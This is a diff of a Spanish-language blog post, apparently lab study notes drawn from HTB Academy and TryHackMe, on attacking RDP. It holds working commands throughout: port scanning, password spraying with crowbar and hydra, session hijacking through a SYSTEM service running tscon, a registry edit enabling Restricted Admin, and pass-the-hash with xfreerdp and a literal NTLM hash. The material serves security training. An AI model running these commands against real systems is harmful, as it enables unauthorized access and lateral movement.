@@ -33,13 +33,10 @@ Por defecto, RDP escucha en el puerto **TCP/3389**.
 El primer paso es confirmar si el servicio RDP está activo en el objetivo.
 
 ```bash
-nmap -Pn -p3389 192.168.2.143
+sudo nmap -p3389 -Pn -sCV 10.129.203.13
 ```
 
-```
-PORT     STATE SERVICE
-3389/tcp open  ms-wbt-server
-```
+![](1776195716480.webp)
 
 Con `-Pn` omitimos el host discovery (útil cuando el host no responde a pings) y apuntamos directamente al puerto 3389.
 
@@ -67,7 +64,7 @@ Con `-Pn` omitimos el host discovery (útil cuando el host no responde a pings) 
 
 ---
 
-## Misconfigurations — Password Spraying
+## Malas configuraciones — Password Spraying
 
 Dado que RDP autentica con credenciales de usuario, el **password guessing** es uno de los ataques más comunes. Sin embargo, hay un punto crítico a considerar: las políticas de bloqueo de cuentas en Windows. Si intentamos demasiadas contraseñas contra un mismo usuario, la cuenta puede quedar bloqueada.
 
@@ -76,7 +73,7 @@ La solución es el **Password Spraying**: probamos **una sola contraseña contra
 ### Crowbar — RDP Password Spraying
 
 ```bash
-crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+crowbar -b rdp -s 10.129.203.13/32 -U users.txt -c 'password123'
 ```
 
 ```
@@ -97,11 +94,11 @@ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 ### Hydra — RDP Password Spraying
 
 ```bash
-hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+hydra -L usernames.txt -p 'password123' 10.129.203.13 rdp
 ```
 
 ```
-[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
+[3389][rdp] host: 10.129.203.13   login: administrator   password: password123
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -119,19 +116,32 @@ Una vez obtenidas las credenciales, podemos conectarnos con `rdesktop` o `xfreer
 **rdesktop:**
 
 ```bash
-rdesktop -u admin -p password123 192.168.2.143
+rdesktop -u admin -p password123 10.129.203.13
 ```
 
+![](1776197990007.webp)
+
 Si el servidor usa un certificado autofirmado, `rdesktop` nos pedirá confirmación antes de continuar. Escribimos `yes` para aceptar y la sesión se abre.
+
+![](1776195901126.webp)
 
 **xfreerdp:**
 
 ```bash
-xfreerdp /v:192.168.220.152 /u:juurena /p:'123qwe@@'
+xfreerdp /v:10.129.203.13 /u:admin /p:'password123'
 ```
+
+![](1776198143451.webp)
 
 > `xfreerdp` es el cliente más moderno y con mayor soporte activo. `rdesktop` está prácticamente en desuso pero sigue funcionando en entornos más viejos.
 {: .prompt-tip }
+
+En el archivo del escritorio nos encontraremos con una sorpresa y un aviso
+
+![](1776202388446.webp)
+
+> Traducción: "Encontramos un hash de la cuenta de administrador de otra máquina. Intentamos usar el hash en este equipo, pero no funcionó. No tiene SMB ni WinRM abiertos, y la función Pass the Hash de RDP no funciona."
+{: .prompt-info }
 
 ---
 
@@ -147,11 +157,7 @@ Este es uno de los ataques más potentes relacionados con RDP en entornos de Act
 query user
 ```
 
-```
- USERNAME     SESSIONNAME   ID  STATE    IDLE TIME  LOGON TIME
->juurena      rdp-tcp#13     2  Active           .  4/27/2022 8:55 AM
- lewen         rdp-tcp#14     4  Active           .  4/27/2022 8:57 AM
-```
+![](1776206040870.webp)
 
 **Paso 1 — Crear un servicio que corra como SYSTEM**
 
@@ -161,9 +167,7 @@ El binario `tscon.exe` permite conectarse a otra sesión de escritorio. Para eje
 sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"
 ```
 
-```
-[SC] CreateService SUCCESS
-```
+![](1776206124774.webp)
 
 **Paso 2 — Iniciar el servicio**
 
@@ -172,6 +176,8 @@ net start sessionhijack
 ```
 
 Al ejecutarse, el servicio corre como SYSTEM y conecta la sesión de `lewen` (ID 4) a nuestra sesión activa (`rdp-tcp#13`). El resultado: una nueva terminal abierta **como** `lewen`, sin haber ingresado su contraseña.
+
+![](1776206158688.webp)
 
 > Esta técnica **ya no funciona en Windows Server 2019** en adelante. En versiones anteriores (2016, 2012 R2) sigue siendo válida.
 {: .prompt-warning }
@@ -186,32 +192,35 @@ En muchos escenarios de post-explotación tenemos el **hash NTLM** de un usuario
 
 Esta técnica requiere que el modo **Restricted Admin** esté habilitado en el objetivo. Por defecto está **desactivado**. Si intentamos conectarnos sin habilitarlo, recibiremos un error de restricción de cuenta.
 
-Para habilitarlo necesitamos acceso al registro del objetivo:
+![](1776203551081.webp)
 
-```cmd
+Para habilitarlo necesitamos acceso al registro del objetivo, podemos hacerlo ejecutando el siguiente comando en `powershell`:
+
+```powershell
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-Esto crea la clave `DisableRestrictedAdmin` con valor `0` (habilitado) en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`.
+Esto crea la clave `DisableRestrictedAdmin` con valor `0` (habilitado) en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`. Podemos confirmarlo entrando al editor de registro y verificando que la clave de registro haya sido añadida.
+
+![](1776203952649.webp)
+
+Podemos usar `xfreerdp` para conectarnos con el hash y el usuario indicados en el archivo `pentest-notes.txt` del escritorio u obtenido de otra forma
 
 **Ejecutar el ataque con xfreerdp:**
 
 ```bash
-xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
 ```
 
-| Flag | Descripción |
-|------|-------------|
-| `/v:` | IP del objetivo |
-| `/u:` | Usuario objetivo |
+| Flag    | Descripción           |
+| ------- | --------------------- |
+| `/v:`   | IP del objetivo       |
+| `/u:`   | Usuario objetivo      |
 | `/pth:` | Hash NTLM del usuario |
 
 Si el ataque es exitoso, obtenemos una sesión RDP completa como el usuario objetivo:
 
-```
-whoami
-superstore\lewen
-```
+![](1776205870475.webp)
 
 > No funciona contra todos los sistemas Windows. Es más efectivo en entornos más antiguos o donde el Restricted Admin Mode ya está habilitado. Siempre vale intentarlo cuando tienes un hash NTLM y sabes que el usuario tiene permisos RDP.
 {: .prompt-info }
@@ -230,6 +239,9 @@ superstore\lewen
 
 ## Conclusión
 
-RDP es un protocolo extremadamente valioso tanto para administradores como para atacantes. Desde un simple password spray para obtener acceso inicial, hasta técnicas más avanzadas como el session hijacking o el Pass-the-Hash para moverse lateralmente dentro de un dominio, entender cómo funciona y cómo atacarlo es fundamental en cualquier evaluación de seguridad.
+`RDP` es un protocolo extremadamente valioso tanto para administradores como para **atacantes**. Desde un simple **password spray** para obtener acceso inicial, hasta técnicas más avanzadas como el **session hijacking** o el **Pass-the-Hash** para moverse lateralmente dentro de un dominio, entender cómo funciona y cómo atacarlo es fundamental en cualquier evaluación de seguridad.
 
-En el contexto de Active Directory, comprometer una sesión RDP puede significar directamente la escalada a **Domain Admin** si el usuario conectado tiene ese nivel de privilegios.
+En el contexto de **Active Directory**, comprometer una sesión `RDP` puede significar directamente la escalada a **Domain Admin** si el usuario conectado tiene ese nivel de privilegios.
+
+> Contenido basado en el material de htb academy y tryhackme :)
+{: .prompt-tip }
